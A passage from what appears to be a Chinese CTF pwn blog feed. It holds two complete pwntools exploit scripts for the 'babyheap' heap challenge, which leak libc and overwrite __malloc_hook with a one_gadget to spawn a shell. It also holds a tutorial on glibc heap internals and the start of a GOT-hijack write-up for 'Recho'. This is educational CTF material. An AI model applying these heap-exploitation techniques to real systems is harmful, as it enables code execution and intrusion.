class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">allocate</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(io)</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'leak:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b78</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>fake_chunk<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x3c4aed</span>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x4526a</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="第二种："><a href="#第二种：" class="headerlink" title="第二种："></a>第二种：</h2><hr><p>这种方法由学长提供，对<strong>堆块重叠</strong>了解不是很深的看这篇<a href="https://oneda1sy.gitee.io/2021/11/16/Heap-Overlapping/#:~:text=%E7%AE%80%E5%8D%95%E7%9A%84%E8%AF%B4%E5%B0%B1%E6%98%AF%E6%89%A9%E5%B1%95,%E9%87%8D%E5%8F%A0%E5%AF%B9%E5%BA%94%E7%9A%84%E5%85%B3%E7%B3%BB%E3%80%82">文章</a><br>这里用的是向后合并的方法</p><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><hr><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>io<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28791</span><span class="token punctuation">)</span><span class="token comment">#io=process('./babyheap')</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Command: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>choice<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>  <span class="token comment">#chunk0 这个堆块可以改变大小</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>  <span class="token comment">#chunk1 经测试，这个堆块要大于等于后面0x100的堆块大小</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>  <span class="token comment">#chunk2 申请大于fastbin范围的堆块用于泄露libc地址指向main_arena+88的位置</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>   <span class="token comment">#chunk3 防止topchunk合并，0x60后面申请fake_chunk有用</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token comment">#按照向前合并要求将chunk1释放</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x108</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x221</span><span class="token punctuation">)</span> <span class="token comment">#修改chunk1的size大小为0x220</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> <span class="token comment">#在chunk0填入</span>add<span class="token punctuation">(</span><span class="token number">0x210</span><span class="token punctuation">)</span> <span class="token comment">#将chunk1申请回来，此时chunk2和chunk1的部分堆块重叠  </span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x108</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x111</span><span class="token punctuation">)</span> <span class="token comment">#用于calloc会将申请得到的堆块chunk1清零，chunk2的size会丢失，将其补上</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">#泄露libc地址</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">#因为chunk2在chunk1范围，打印chunk1会顺带把chunk2的内容打印出来</span>leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'leak:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span> libc_base<span class="token operator">=</span>leak<span class="token operator">-</span><span class="token number">0x3c4b78</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'libc_base:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>fake_chunk<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x3c4aed</span>add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token comment">#把chunk2补上</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment">#chunk4</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">#free chunk4使用doublefree获取fake_chunk</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span> <span class="token comment">#获得fakechunk</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x4526a</span><span class="token punctuation">)</span> <span class="token comment">#覆盖mallok_hook为one_gadget</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment">#再次调用执行malloc_hook </span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 pwn-write-up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux动态内存管理</title>
      <link href="/2023/01/16/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
      <url>/2023/01/16/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="linux动态内存管理（堆基础）"><a href="#linux动态内存管理（堆基础）" class="headerlink" title="linux动态内存管理（堆基础）"></a>linux动态内存管理（堆基础）</h1><p>终于到了堆，这里是学pwn的分水岭，是新人杀手，每一届都会有很多人在这被劝退改方向，因为堆确实很玄学。</p><h2 id="导入"><a href="#导入" class="headerlink" title="导入"></a>导入</h2><p>我们之前学过，栈上存储的是一个函数的局部变量，bss存储全局变量。如果用户向程序输入一个几千字的留言怎么办，开一个二维大数组？首先长度会有限制如果开的<br>数组字节过长那么对于程序而言就会造成空间浪费，如果想要回收这段没用的空间要如何呢？在libc中，我们可以通过malloc(size)来给用户分配一段长度为size的<br>内存，通过free(ptr)来释放这段内存区域。这些数据，被统一的存放在了堆中，维护这些数据的运行机制在glibc中，称之为ptmalloc。</p><h2 id="0x01-堆题与栈题的区别"><a href="#0x01-堆题与栈题的区别" class="headerlink" title="0x01 堆题与栈题的区别"></a>0x01 堆题与栈题的区别</h2><ul><li>1、堆的漏洞比栈有更多的形式和利用方式，堆漏洞所需要的条件比栈更少。</li><li>2、一般情况下栈溢出起码需要16个字节，也就是至少溢出到返回地址才能利用，<strong>但是堆的话只需要一个字节就可完成利用</strong>。栈的话基本都会关闭一两个保护机制，<strong>堆的话一般全开</strong>。</li></ul><h2 id="0x02-堆的结构"><a href="#0x02-堆的结构" class="headerlink" title="0x02 堆的结构"></a>0x02 堆的结构</h2><p>在内存中，堆是以一个个堆块构成的，这些堆块称之为chunk。在64位系统中，堆块的大小是8字节对齐的，我们申请一个15字节长度的堆块，实际到我们手中的用户可<br>控的数据区域大小为16字节。<strong>但是实际可以说是16字节对齐，假设申请了0x58个字节的chunk，实际到手的却是是0x60的大小</strong><br>一个堆块除了用户数据区外，还有头部字段，头部字段的长度为16字节。同时在64位系统中，一个堆块最小长度为32字节（包括头部），也就是说，<strong>我们分配一个1字节<br>的堆块，他的实际长度是32字节（0x20）。（最小的chunk）</strong><br>下面是chunk的图：<br><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/1.png"><br>prev_size 和size字段分别代表前一个chunk的大小以及当前chunk的大小，大小都是8字节，两个一共16字节，称之为chunk的头部字段。后面的user data区域是<br>用户可以输入数据的地方。为了节省空间，将size的最低三个bit设置为三个标志位，<strong>从高到低分别为non_main_arena、is_mmap、prev_inuse 。</strong></p><ul><li>non_main_arena用来记录当前chunk是否不属于主线程，1表示不属于，0表示属于。</li><li>is_mmap表示当前chunk是否由mmap分配的，1表示属于，0表示不属于。</li><li>prev_inuse用来表示前面紧邻的那个chunk是否正在使用，0表示前面的chunk已经被释放，1表示正在被用户使用</li><li>prev_size 和size字段分别代表前一个chunk的大小以及当前chunk的大小，大小都是8字节</li></ul><p>这里注意prevsize记录前面一个chunk的大小。这里注意，prevsize只有在前面的chunk被free掉的时候才生效，也就是说，只有在prev_inuse为0的时候，系统才<br>把prev_size字段当作prevsize。<strong>如果chunk正在被使用，那么他会把下一个chunk的prevsize字段当作userdata。充分利用空间。</strong>例如也就是说，如果我们申<br>请一个0x80长度大小的区域，系统实际给我们0x90大小（0x10头部），<strong>如果我们申请0x88大小的区域，系统同样也会给我们0x90大小的区域（算头部），剩下的8字节，<br>使用nextchunk的prevsize区域。</strong>因为，只有当一个chunk被释放的时候，nextchunk的prevsize才真正代表前一个chunk的大小</p><h2 id="0x03-特殊的堆块：topchunk"><a href="#0x03-特殊的堆块：topchunk" class="headerlink" title="0x03 特殊的堆块：topchunk"></a>0x03 特殊的堆块：topchunk</h2><p>最开始时，程序的堆还未被使用，整个的堆区域属于一个很大的堆块叫做topchunk。当已经被使用的空间不够时，程序就会从topchunk中分割一块出来个程序使用。</p><h2 id="0x04-堆块的管理"><a href="#0x04-堆块的管理" class="headerlink" title="0x04 堆块的管理"></a>0x04 堆块的管理</h2><h3 id="0x04-1-bin的类型"><a href="#0x04-1-bin的类型" class="headerlink" title="0x04(1) bin的类型"></a>0x04(1) bin的类型</h3><p>bins的类型图：<br><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/6.png"><br>为了保证程序的快速运行，而且方便系统内存管理，所以ptmalloc将释放后的堆块根据其大小分成不同的bin。</p><ul><li>fastbin：大小范围：0x20 - 0x80</li><li>smallbin:大小范围：0x90 - 0x400</li><li>Large bin:大小范围：0x410 以上</li><li>unsortedbin ：未被归类的bin，临时存储用，存放的堆块大小不一定多大</li></ul><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><p><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/7.png"></p><ul><li>1、管理fastbin free chunk，单链表结构，FILO（最后一个进入fastbin链表的，会被放在头部）。</li><li>2、总共有十个fastbin链表，每个链表中fastbin的size一样，0x10递增</li><li>3、大小属于fastbin的chunk被free掉时，<strong>不会改变nextchunk的previnuse位，也就是说不会被合并</strong>。</li></ul><h4 id="Unsortedbin"><a href="#Unsortedbin" class="headerlink" title="Unsortedbin"></a>Unsortedbin</h4><p><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/8.png"></p><ul><li>1、管理 unsorted chunk，只有一个双向链表</li><li>2、所有大小大于fastbin的chunk都会先被暂时放入unsortedbin中,链表中的chunk大小不一</li></ul><h4 id="Smallbin"><a href="#Smallbin" class="headerlink" title="Smallbin"></a>Smallbin</h4><ul><li>1、管理small chunk，由62个双向链表组成，每个链表中的chunk大小一样，大小以0x10递增。（长得和unsortedbin差不多偷个懒就不画图了.）</li></ul><h4 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h4><ul><li>1、管理large chunk，63个双向链表，FIFO先进先出。</li><li>2、同一个双线链表中chunk大小可以不一样，但是在一定范围内，bins大小从小到大排列。</li></ul><h3 id="0x04-2-chunk-free后的内容"><a href="#0x04-2-chunk-free后的内容" class="headerlink" title="0x04(2) chunk free后的内容"></a>0x04(2) chunk free后的内容</h3><p>chunk被free之后的样子如图。<br><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/2.png"><br>由于chunk被free了，所以按常理说用户不应该能够访问到这个chunk。于是乎在userdata区域存放一些用于管理内存的指针信息。</p><h3 id="0x04-3-bin中的指针类型"><a href="#0x04-3-bin中的指针类型" class="headerlink" title="0x04(3) bin中的指针类型"></a>0x04(3) bin中的指针类型</h3><p>如上图参考位置：</p><ul><li>fastbin：单链表结构，只有fd</li><li>small &amp;unsortedbin：双向链表结构，fd和bk都有</li><li>largebin：双向链表，fdbk都有，同时还有fd nextsize 和 bk nextsize</li></ul><h2 id="0x05-堆块的合并操作"><a href="#0x05-堆块的合并操作" class="headerlink" title="0x05 堆块的合并操作"></a>0x05 堆块的合并操作</h2><p>如果我们free掉一个堆块，<strong>（可能）</strong>会<strong>触发</strong>向前合并和向后合并。（两个相邻的都为0则合并，朝已经是0的方向合并）<br>向前合并：<br><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/3.png"></p><ul><li>检查当前chunk的previnuse位，如果为0，则根据当前chunk的prev size找到prev chunk的头，两个堆块合并<br>向后合并：<br><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/4.png"></li><li>检查当前chunk的next chunk 的prev inuse位（因为一个堆块的状态由他后面chunk的previnuse位决定，所以确定nextchunk的状态需要检查next next chunk的previnuse位，怎么找？size就行），然后根据nextchunk的状态决定是否合并。</li></ul><h2 id="0x06-arena"><a href="#0x06-arena" class="headerlink" title="0x06 arena"></a>0x06 arena</h2><p>arena是一块结构体，用于管理bins。主线程创建的arena称之为main_arena,其他的叫threadarena<br>如图：<br><img src="/images/linux%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/5.png"></p><h2 id="malloc调用机制"><a href="#malloc调用机制" class="headerlink" title="malloc调用机制"></a>malloc调用机制</h2><p>在fastbin范围内：检查对应的bin链表中有没有chunk，</p><ul><li>有，分配给用户，完成</li></ul><p>在smallbin范围内：检查对应大小的bin链表中有没有chunk，</p><ul><li>有，取出来给程序，完成。</li></ul><p>如果不在smallbin范围内，或者smallbin里面也没有：unsortedbin中：有的话，从尾部取出第一个chunk，看看大小是否满足需求。<br>满足，切分后大小是否大于minsize？</p><ul><li>大于，切分块，返回给用户，剩下的块放进unsortedbin</li><li>小于等于minsize，直接返回给用户，完成</li><li>不满足，把这个块放入small&#x2F;largebin对应的链表中，继续遍历下一个块。</li></ul><p>如果unsortedbin中所有的块也不能满足需求：<br>largebin范围：检查对应的bin链表中有没有符合的chunk。</p><ul><li>有，找到满足需求最小的chunk，切分块返回，剩下的放进unsortedbin中。</li></ul><p>largebin也不行？再次遍历small&#x2F;large找best fit的chunk</p><ul><li>还是没有，那就从topchunk中切割</li></ul><p>topchunk也不够？</p><ul><li>mmap系统调用。</li></ul><h2 id="free调用机制："><a href="#free调用机制：" class="headerlink" title="free调用机制："></a>free调用机制：</h2><p>free的chunk大小属于fastbin吗？</p><ul><li>是，放进fastbin，完成。</li></ul><p>是mmap分配的吗？</p><ul><li>是，调用munmap回收，完成</li></ul><p>前一个chunk空闲吗？</p><ul><li>是，向前合并。</li></ul><p>后一个chunk是free的吗？</p><ul><li>是，向后合并。放进unsortedbin，完成。</li></ul><p>后一个chunk是topchunk吗？</p><ul><li>是，和topchunk合并，完成。</li></ul><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>想要做出ctf的堆题，必须要对堆的管理机制了如指掌，需要大量刷题。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>got表劫持实战讲解</title>
      <link href="/2023/01/12/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/"/>
      <url>/2023/01/12/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界Recho"><a href="#攻防世界Recho" class="headerlink" title="攻防世界Recho"></a>攻防世界Recho</h1><p>对于这题有两个知识点要讲1、got表劫持2、pwntools的shutdown用法场景<br>先checksec一下：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/1.png"><br>开了NX保护机制看起来还行，但作为进阶pwn应该不会太简单。<br>拖进IDA查看：<br><img src="/images/got%E8%A1%A8%E5%8A%AB%E6%8C%81%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3/2.png"><br>代码不会花里胡哨，没有调用杂七杂八的函数，同样没有后门函数。<br>这里溢出点非常简单，只要读入nptr，**v7 &#x3D; atoi(nptr)**会自动将读入的nptr进行整型转换，atoi函数自行去网上搜，这里不作过多赘述。<br><strong>v6 &#x3D; read(0, buf, v7)</strong>;只要v7足够大，那么buf就可以无限读入实现溢出。但难点在于如何结束循环，因为不管怎样read只要有读入返回值就一定不会是0。</p><h2 id="0x01-pwntools-shutdown方法"><a href="#0x01-pwntools-shutdown方法" class="headerlink" title="0x01 pwntools shutdown方法"></a>0x01 pwntools shutdown方法</h2><p>如果是在linux终端上直接运行，我们可以用Ctrl+D，然而，pwn远程，就无法处理这种信号。幸运的是pwntools提供了一个shutdown功能，<strong>该功能可以关闭流，如果我们关闭输入流,这个循环就结束了。但是我们别想再次ROP到主函数获取输入，因为关闭后就不能打开，除非重新运行</strong>，那么之前的工作不都白费了吗。因此，我们必须一次性完成所有操作。<br>一次性要完成所有操作，那么暴露地址的方式肯定不能完成，幸运的是，我们可以使用系统调用(syscall)。对于有些系统,system也可以用系统调用,而对于有些系统则不行，因此，我们这里<strong>不再get shell，我们直接读取flag，然后打印出来</strong>。<del>这样rop链会非常的长……</del></p><h2 id="0x02-got表劫持"><a href="#0x02-got表劫持" class="headerlink" title="0x02 got表劫持"></a>0x02 got表劫持</h2><p>为了实现以上想法我们想要构造这样的一条链：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span>READONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buf<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">write</span><span class="token punctuation">(</span><span 